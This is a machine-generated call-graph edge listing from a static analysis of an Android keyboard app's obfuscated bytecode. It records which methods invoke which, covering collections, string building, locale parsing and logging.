VIRTUAL edge: $r3 = virtualinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>($r0) in <hcb: hbv v(j$.util.concurrent.ConcurrentHashMap,java.lang.String,java.lang.Object)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <iej: void g(java.lang.String,iec)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke r0.<hbv: void j()>() in <hbv: boolean o()> ==> <hbv: void j()>
SPECIAL edge: $r1 = specialinvoke r0.<ljf: java.lang.Object[] s()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.lang.Object[] s()>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c1) in <ivw: boolean F(java.lang.String)> ==> <ivw: boolean u(char)>
STATIC edge: $r2 = staticinvoke <ivw: ivv I()>() in <ivw: ivw d(java.util.Locale)> ==> <ivw: ivv I()>
VIRTUAL edge: $i0 = virtualinvoke $r0.<java.lang.String: int length()>() in <ivw: boolean B(java.lang.String)> ==> <java.lang.String: int length()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: int hashCode()>
VIRTUAL edge: $l1 = virtualinvoke $r3.<j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>(class "Lj$/util/concurrent/ConcurrentHashMap;", "cellsBusy") in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, 0, $r3) in <lqq: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
STATIC edge: $z1 = staticinvoke <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>($r2, $r1) in <hbv: void k(java.lang.Object,boolean)> ==> <j$.util.Objects: boolean deepEquals(java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <lkq: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkq: void <clinit>()>
VIRTUAL edge: $r3 = virtualinvoke $r6.<java.lang.String: java.lang.String concat(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lqc: void <init>()> ==> <lqd: void <init>()>
INTERFACE edge: $r9 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getValue()>() in <lmb: lme f()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: int[] w()>() in <ljd: int z(int,int,int,int)> ==> <ljd: int[] w()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.String: int hashCode()>() in <ivw: int hashCode()> ==> <java.lang.String: int hashCode()>
CLINIT edge: staticinvoke <java.util.concurrent.TimeUnit: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.concurrent.TimeUnit: void <clinit>()>
STATIC edge: $z0 = staticinvoke <lma: boolean x(int,int)>($i5, $i1) in <lma: lma i(int,java.lang.Object[])> ==> <lma: boolean x(int,int)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r3, $i2, 2) in <ivv: ivw b(java.lang.String)> ==> <iwt: void g(char[],int,int)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Invalid subtag: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <ojg: void v(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <nvw: void j(int[],int[],int,int,int)>($r4, $r4, $i0, $i3, $i1) in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <nvw: void j(int[],int[],int,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: $i0 = interfaceinvoke $r3.<java.util.List: int size()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: int size()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i0) in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
VIRTUAL edge: $z0 = virtualinvoke r0.<ljd: boolean v()>() in <ljd: int f(java.lang.Object)> ==> <ljd: boolean v()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r12 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l r(j$.util.concurrent.s)>
VIRTUAL edge: virtualinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r2, $r3) in <lli: void c(java.util.Map$Entry)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
INTERFACE edge: $l0 = interfaceinvoke $r2.<ltn: long e()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsn: long e()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<ljf: java.lang.Object e(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: java.lang.Object e(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Enum: void <init>(java.lang.String,int)>($r1, $i0) in <lpi: void <init>(java.lang.String,int)> ==> <java.lang.Enum: void <init>(java.lang.String,int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
SPECIAL edge: specialinvoke $r1.<ltc: void <init>(java.lang.String,int,int)>("SMALL", 0, 10) in <ltc: void <clinit>()> ==> <ltc: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.util.AbstractSet: int hashCode()>
VIRTUAL edge: $r3 = virtualinvoke $r1.<lkf: java.lang.Object get(java.lang.Object)>($r2) in <ivw: java.lang.String p()> ==> <lqk: java.lang.Object get(java.lang.Object)>
SPECIAL edge: specialinvoke $r2.<java.lang.IllegalStateException: void <init>(java.lang.String)>("cannot request log site information prior to postProcess()") in <lsn: lsq f()> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r8.<mag: void <init>(java.lang.String,int,int)>("TENOR_GIF_FULL_IMAGE", 8, 8) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("extlang subtag only occurs when language subtag length is 2 or 3") in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(int)>($i1) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r4) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
INTERFACE edge: $i1 = interfaceinvoke $r4.<java.util.Set: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <liy: int size()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <java.util.logging.Level: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.util.logging.Level: void <clinit>()>
STATIC edge: $r3 = staticinvoke <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>($r1, $r2, $i0, $i1, $r3) in <lqk: java.lang.Object get(java.lang.Object)> ==> <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <lum: java.lang.String[] o()>() in <luk: void <clinit>()> ==> <lum: java.lang.String[] o()>
STATIC edge: $r17 = staticinvoke <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>($z0) in <hbw: java.lang.Object a(java.lang.Object)> ==> <java.lang.Boolean: java.lang.Boolean valueOf(boolean)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.Object cast(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <lvr: void <init>(lvr,lvr)> ==> <java.util.AbstractMap: void <init>()>
STATIC edge: $z0 = staticinvoke <lri: boolean a(java.util.Comparator,java.lang.Iterable)>($r5, $r4) in <lqs: boolean equals(java.lang.Object)> ==> <lri: boolean a(java.util.Comparator,java.lang.Iterable)>
SPECIAL edge: $r7 = specialinvoke $r2.<lvr: java.util.Map$Entry c(int)>(0) in <lvr: void <init>(lvr,lvr)> ==> <lvr: java.util.Map$Entry c(int)>
SPECIAL edge: specialinvoke $r5.<lsm: void <init>()>() in <lsn: void q(lsz,java.lang.Object)> ==> <lsm: void <init>()>
SPECIAL edge: specialinvoke $r17.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r19) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
CLINIT edge: staticinvoke <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <com.google.android.apps.inputmethod.latin.LatinApp: void <clinit>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(45) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/inputmethodentry/InputMethodEntryManager") in <hnt: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.os.ParcelFileDescriptor openFile(android.net.Uri,java.lang.String)>(null, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.os.ParcelFileDescriptor openFile(android.net.Uri,java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <lid: int hashCode()>
VIRTUAL edge: virtualinvoke $r19.<java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>() in <lsd: boolean b(lsr)> ==> <java.util.concurrent.atomic.AtomicInteger: int incrementAndGet()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <java.lang.String: int hashCode()>
VIRTUAL edge: $r4 = virtualinvoke $r4.<java.lang.String: java.lang.String substring(int)>($i0) in <ivw: java.lang.String p()> ==> <java.lang.String: java.lang.String substring(int)>
STATIC edge: $i1 = staticinvoke <java.lang.Integer: int numberOfLeadingZeros(int)>($i1) in <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l[] e(j$.util.concurrent.l[],j$.util.concurrent.l)> ==> <java.lang.Integer: int numberOfLeadingZeros(int)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lvt: void <init>(lvr)> ==> <java.lang.Object: void <init>()>
VIRTUAL edge: $r4 = virtualinvoke r0.<ljd: java.lang.Object[] x()>() in <ljd: void r(int,java.lang.Object,java.lang.Object,int,int)> ==> <ljd: java.lang.Object[] x()>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <lsp: boolean equals(java.lang.Object)>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lrg: int hashCode()> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
STATIC edge: $r1 = staticinvoke <kwe: miy x(java.lang.Object)>(null) in <her: void <clinit>()> ==> <kwe: miy x(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<mii: void <init>()>() in <mij: void <init>(miy)> ==> <mii: void <init>()>
VIRTUAL edge: $i3 = virtualinvoke $r1.<java.lang.String: int length()>() in <lsz: void <init>(java.lang.String,java.lang.Class,boolean,boolean)> ==> <java.lang.String: int length()>
SPECIAL edge: specialinvoke $r3.<java.util.Date: void <init>(long)>($l0) in <lsc: void f(java.lang.String,ltn)> ==> <java.util.Date: void <init>(long)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>(r0, $l3, $i1, $i4) in <j$.util.concurrent.ConcurrentHashMap: void q(int)> ==> <j$.sun.misc.b: boolean c(java.lang.Object,long,int,int)>
STATIC edge: $r4 = staticinvoke <lma: lma i(int,java.lang.Object[])>($i0, $r1) in <lly: lma g()> ==> <lma: lma i(int,java.lang.Object[])>
SPECIAL edge: $z0 = specialinvoke r0.<hbv: boolean o()>() in <hbv: boolean m(java.lang.Object)> ==> <hbv: boolean o()>
VIRTUAL edge: $z1 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object g(java.lang.Object,java.lang.Object,boolean)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(10) in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r7, $i5, $i1) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: void an(java.lang.Object,int,int)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <lsp: boolean equals(java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" but determined result is ") in <ivv: ivw a()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r0.<java.util.Collection: java.lang.Object[] toArray()>() in <lma: lma p(java.util.Collection)> ==> <java.util.AbstractCollection: java.lang.Object[] toArray()>
VIRTUAL edge: $r3 = virtualinvoke $r25.<java.lang.Class: java.lang.String getName()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.Class: java.lang.String getName()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
STATIC edge: $r3 = staticinvoke <j$.sun.misc.b: j$.sun.misc.b h()>() in <j$.util.concurrent.ConcurrentHashMap: void <clinit>()> ==> <j$.sun.misc.b: j$.sun.misc.b h()>
SPECIAL edge: specialinvoke $r1.<java.util.LinkedHashSet: void <init>(int,float)>($i0, 1.0F) in <ljf: java.util.Set f()> ==> <java.util.LinkedHashSet: void <init>(int,float)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>() in <ojg: void g(java.lang.Throwable,java.lang.String)> ==> <java.lang.Throwable: java.lang.StackTraceElement[] getStackTrace()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(12) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
STATIC edge: staticinvoke <iej: void g(java.lang.String,iec)>("InputMethodEntryManager_GlobalAdditionalImeDefsLoaded", $r5) in <hnt: void <clinit>()> ==> <iej: void g(java.lang.String,iec)>
STATIC edge: $i1 = staticinvoke <izw: int ac(int)>($i1) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <izw: int ac(int)>
STATIC edge: $r1 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r1, $i1) in <lkg: void g(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<java.lang.Object: boolean equals(java.lang.Object)>($r1) in <lta: boolean equals(java.lang.Object)> ==> <lsp: boolean equals(java.lang.Object)>
STATIC edge: staticinvoke <iwt: void f(char[],int,int)>($r1, $i1, $i2) in <iwt: java.lang.String d(java.lang.String)> ==> <iwt: void f(char[],int,int)>
STATIC edge: staticinvoke <hbu: hbs f(java.lang.String,long)>("client_error_logging_level", $l0) in <com.google.android.apps.inputmethod.libs.framework.core.AppBase: void <clinit>()> ==> <hbu: hbs f(java.lang.String,long)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<lkx: boolean containsKey(java.lang.Object)>($r1) in <ivw: boolean P()> ==> <lkx: boolean containsKey(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean s(java.lang.String)>($r0) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean s(java.lang.String)>
STATIC edge: $r6 = staticinvoke <lma: lly g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lma: lly g()>
INTERFACE edge: interfaceinvoke $r1.<java.util.Set: boolean add(java.lang.Object)>($r2) in <ljf: java.util.Set f()> ==> <java.util.HashSet: boolean add(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lqo: void <init>(lkx,lkq)>(r0, $r1) in <lqq: lma g()> ==> <lqo: void <init>(lkx,lkq)>
STATIC edge: $r6 = staticinvoke <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>($r4, $i0) in <j$.util.concurrent.ConcurrentHashMap: void p(j$.util.concurrent.l[],int)> ==> <j$.util.concurrent.ConcurrentHashMap: j$.util.concurrent.l m(j$.util.concurrent.l[],int)>
SPECIAL edge: specialinvoke $r0.<hny: void <init>(ivw,java.lang.String)>($r2, $r3) in <hny: hny a(hmm)> ==> <hny: void <init>(ivw,java.lang.String)>
VIRTUAL edge: $l2 = virtualinvoke $r1.<java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>(-4942790177534073029L) in <j$.util.concurrent.ThreadLocalRandom: void c()> ==> <java.util.concurrent.atomic.AtomicLong: long getAndAdd(long)>
VIRTUAL edge: $r3 = virtualinvoke $r3.<java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>(0, "No logging platforms found:") in <luk: lum a(java.lang.String[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder insert(int,java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r9.<java.lang.StringBuilder: java.lang.String toString()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: $r2 = virtualinvoke r0.<lsn: lts l()>() in <lsd: boolean b(lsr)> ==> <lsn: lts l()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<ljf: int d(int)>($i0) in <lje: java.lang.Object next()> ==> <ljf: int d(int)>
INTERFACE edge: $r2 = interfaceinvoke $r1.<java.util.Map$Entry: java.lang.Object getKey()>() in <lli: void c(java.util.Map$Entry)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $r3 = interfaceinvoke $r8.<java.util.Map$Entry: java.lang.Object getKey()>() in <lmb: lme f()> ==> <lki: java.lang.Object getKey()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljd: int f(java.lang.Object)>($r1) in <ljd: java.lang.Object get(java.lang.Object)> ==> <ljd: int f(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljd: void p()>() in <ljd: java.util.Map m()> ==> <ljd: void p()>
STATIC edge: $r12 = staticinvoke <hnc: java.lang.String d(hmm)>($r10) in <hbw: java.lang.Object a(java.lang.Object)> ==> <hnc: java.lang.String d(hmm)>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
STATIC edge: $i1 = staticinvoke <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>($r1, $r8) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: int i(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r17 = virtualinvoke $r15.<java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>($r16) in <lvm: lum j()> ==> <java.lang.Class: java.lang.reflect.Constructor getDeclaredConstructor(java.lang.Class[])>
STATIC edge: staticinvoke <iye: void O(int,int)>($i0, $i1) in <lqm: java.lang.Object get(int)> ==> <iye: void O(int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>("invalid maximum depth: 0") in <lwf: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
VIRTUAL edge: $i1 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lid: int hashCode()> ==> <java.lang.String: int hashCode()>
CLINIT edge: staticinvoke <lkx: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lkx: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(1) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $r7 = virtualinvoke r0.<ljd: java.lang.Object j()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.lang.Object j()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Enum: boolean equals(java.lang.Object)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
CLINIT edge: staticinvoke <lsl: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsl: void <clinit>()>
VIRTUAL edge: $i0 = virtualinvoke $r2.<java.lang.String: int length()>() in <ivv: ivw a()> ==> <java.lang.String: int length()>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <lwk: void <init>()> ==> <java.lang.Object: void <init>()>
STATIC edge: $r1 = staticinvoke <lqq: lqq r(int,java.lang.Object[],lkt)>($i0, $r0, null) in <lqq: lqq a(int,java.lang.Object[])> ==> <lqq: lqq r(int,java.lang.Object[],lkt)>
STATIC edge: $r5 = staticinvoke <ivw: java.lang.String[] Q(java.util.List)>($r4) in <ivw: void <init>(ivv,java.lang.String)> ==> <ivw: java.lang.String[] Q(java.util.List)>
SPECIAL edge: specialinvoke $r13.<mag: void <init>(java.lang.String,int,int)>("AVATAR_STICKER_METADATA", 13, 13) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lsp: int a()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("TenorImageThumbnail", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
VIRTUAL edge: $z0 = virtualinvoke r0.<liz: boolean hasNext()>() in <liz: java.lang.Object next()> ==> <liz: boolean hasNext()>
CLINIT edge: staticinvoke <lsn: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lsn: void <clinit>()>
SPECIAL edge: specialinvoke $r0.<lkl: void <init>()>() in <lkq: lkl e()> ==> <lkl: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: int size()> ==> <ljf: java.util.Set g()>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke r0.<lss: void setStackTrace(java.lang.StackTraceElement[])>($r2) in <lss: void <init>(java.lang.Throwable,ltc,java.lang.StackTraceElement[])> ==> <java.lang.Throwable: void setStackTrace(java.lang.StackTraceElement[])>
INTERFACE edge: $r4 = interfaceinvoke $r3.<java.util.List: java.util.Iterator iterator()>() in <ivv: java.lang.String c()> ==> <java.util.ArrayList: java.util.Iterator iterator()>
INTERFACE edge: interfaceinvoke $r0.<java.util.Map: java.lang.Object put(java.lang.Object,java.lang.Object)>($r2, $r6) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(14) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
SPECIAL edge: specialinvoke $r2.<j$.util.concurrent.ConcurrentHashMap: void <init>()>() in <hcb: void <init>()> ==> <j$.util.concurrent.ConcurrentHashMap: void <init>()>
STATIC edge: $r1 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <ljd: java.lang.Object[] y()> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r3.<lmb: void <init>()>() in <hbv: void j()> ==> <lmb: void <init>()>
VIRTUAL edge: virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <ivv: java.lang.String c()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r4.<nzh: void d()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: void d()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int ah(int)>
SPECIAL edge: specialinvoke $r1.<ljb: void <init>(ljd,int)>($r2, $i0) in <liw: java.lang.Object a(int)> ==> <ljb: void <init>(ljd,int)>
STATIC edge: $r0 = staticinvoke <lsz: lsz c(java.lang.String,java.lang.Class)>("forced", class "Ljava/lang/Boolean;") in <lsl: void <clinit>()> ==> <lsz: lsz c(java.lang.String,java.lang.Class)>
VIRTUAL edge: $i0 = virtualinvoke r0.<lvr: int size()>() in <lvr: int b()> ==> <java.util.AbstractMap: int size()>
SPECIAL edge: specialinvoke r0.<lkq: void <init>()>() in <lqm: void <init>(lqn)> ==> <lkq: void <init>()>
SPECIAL edge: specialinvoke r0.<lsz: void <init>(java.lang.String,java.lang.Class,boolean)>("group_by", $r1, 1) in <lsj: void <init>(java.lang.Class)> ==> <lsz: void <init>(java.lang.String,java.lang.Class,boolean)>
STATIC edge: $r0 = staticinvoke <lsh: lsh j(java.lang.String)>("com/google/android/libraries/inputmethod/experiment/FlagManager") in <hcb: void <clinit>()> ==> <lsh: lsh j(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<ljd: java.util.Map o()>() in <ljd: int size()> ==> <ljd: java.util.Map o()>
STATIC edge: staticinvoke <iwt: void r(char[],int,int,char,char,int)>($r1, $i3, $i4, $c0, $c1, $i2) in <iwt: char[] s(java.lang.String,char,char,int)> ==> <iwt: void r(char[],int,int,char,char,int)>
